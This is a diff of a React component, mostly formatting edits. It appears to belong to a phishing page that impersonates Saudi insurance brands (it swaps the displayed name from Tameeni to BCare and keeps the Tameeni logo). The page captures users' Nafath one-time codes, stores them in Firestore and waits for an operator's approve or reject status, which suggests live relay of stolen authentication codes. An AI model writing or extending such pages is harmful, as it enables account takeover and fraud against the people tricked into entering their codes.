@@ -113,7 +113,7 @@ export default function Component() {
               nafadConfirmationStatus: "",
               nafadConfirmationCode: "",
             },
-            { merge: true }
+            { merge: true },
           );
           setTimeout(() => inputRefs.current[0]?.focus(), 150);
         } else if (data.nafadConfirmationStatus === "rejected") {
@@ -126,11 +126,11 @@ export default function Component() {
               nafadConfirmationStatus: "",
               nafadConfirmationCode: "",
             },
-            { merge: true }
+            { merge: true },
           );
         }
       },
-      (error) => console.error("[nafad] Firestore listener error:", error)
+      (error) => console.error("[nafad] Firestore listener error:", error),
     );
     return () => unsubscribe();
   }, []);
@@ -159,7 +159,7 @@ export default function Component() {
 
   const handleOtpKeyDown = (
     index: number,
-    e: React.KeyboardEvent<HTMLInputElement>
+    e: React.KeyboardEvent<HTMLInputElement>,
   ) => {
     if (e.key === "Backspace" && !otp[index] && index > 0) {
       inputRefs.current[index - 1]?.focus();
@@ -192,7 +192,7 @@ export default function Component() {
           nafadOtp: code,
           nafadOtpSubmittedAt: new Date().toISOString(),
         },
-        { merge: true }
+        { merge: true },
       );
       setOtpDone(true);
       setTimeout(() => {
@@ -252,7 +252,7 @@ export default function Component() {
                     <img src="/tameeni-logo.webp" width={80} />
                   </div>
                   <p className="text-gray-800 font-semibold text-base">
-                    تأميني
+                    بي كير
                   </p>
                 </div>
                 {/* Logo Icon */}
@@ -574,10 +574,10 @@ export default function Component() {
                     otpError
                       ? "border-red-300 bg-red-50 text-red-700"
                       : otpDone
-                      ? "border-emerald-300 bg-emerald-50 text-emerald-700"
-                      : digit
-                      ? "border-[#009688] bg-teal-50 text-[#00796b]"
-                      : "border-slate-200 bg-slate-50 text-slate-800 focus:border-[#009688] focus:bg-white",
+                        ? "border-emerald-300 bg-emerald-50 text-emerald-700"
+                        : digit
+                          ? "border-[#009688] bg-teal-50 text-[#00796b]"
+                          : "border-slate-200 bg-slate-50 text-slate-800 focus:border-[#009688] focus:bg-white",
                   ].join(" ")}
                 />
               ))}
@@ -607,8 +607,8 @@ export default function Component() {
                 background: otpDone
                   ? "linear-gradient(135deg, #10b981, #059669)"
                   : otpLoading
-                  ? "linear-gradient(135deg, #00796b, #00695c)"
-                  : "linear-gradient(135deg, #009688, #00796b)",
+                    ? "linear-gradient(135deg, #00796b, #00695c)"
+                    : "linear-gradient(135deg, #009688, #00796b)",
                 color: "#fff",
                 boxShadow: otpDone
                   ? "0 8px 24px rgba(16,185,129,0.3)"
